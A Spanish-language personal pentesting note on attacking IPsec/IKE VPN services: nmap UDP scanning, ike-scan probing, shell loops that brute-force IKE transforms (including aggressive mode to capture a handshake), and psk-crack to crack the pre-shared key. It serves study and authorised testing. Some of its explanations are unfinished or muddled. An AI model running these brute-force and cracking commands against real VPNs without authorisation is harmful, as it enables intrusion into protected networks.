Mas información [Aquí](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)

Este es un puerto UDP, la mejor forma (y mas rapida), de encontrar este tipo de puertos es usando el siguiente comando:

```ruby
nmap {IP} --top-ports 100 -sU -Pn -vvv -n -T5 
```

Esto nos debería dar como resultado lo siguiente:

![[Pasted image 20251002141007.png]]

# Que es ISAKMP 

ISAKMP (Internet Security Association and Key Management Protocol)  es el encargado de negociar que metodos y algoritmos de encriptacion se van a usar en la conexion de IPsec, dando un resultado final llamado ==SA o Security association==, el cual contiene algo llamado "transformations" que son cada una de las opciones que se proponen, por ejemplo:

```ruby

"encryption algorithm: 3DES" -> *esto es una transformacion* ESP

"integrity algorithm: MD5" -> *otra transformacion* AH

"authentication type: PSK(Presharedkey)" -> *otra transformacion* AH
```


IKE (o Internet Key Exchange) es NOSE


# Ataque

Como pentesters primero vamos a usar el siguiente comando:

```ruby
ike-scan {IP}
```

Este comando envia un transform set (un conjunto de varios transforms, uno par authentication, uno para integrity, etc...), y recibe la respuesta del servidor:

Si recibimos 1 handshake and 0 notify, significa que IKE ha realizado un Handshake, lo que significa que IPSec ha aceptado nuestra propuesta, ahora tenemos que saber cual es el ID (group name)

Pero si recibimos 0 handshake y 1 notify, tenemos que hacer fuerza bruta a las transformaciones.
## ==Fuerza bruta a las transformaciones==

Crear archivo con todas las posibles transforms:

```ruby
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```

Hacer fuerza bruta

```ruby
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```

IMPORTANTE: Puede que el servidor a pesar de recibir transformaciones validas, repsonda sin handshake, para solucionar esto haremos la fuerza bruta pero con un modo agresivo:

```ruby
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```


# ==Hacer fuerza bruta al PSK (Pre-Shared Key)==


Para esto haremos uso de la herramienta :

```ruby
psk-crack -d {WORDLIST} {HASH}
```





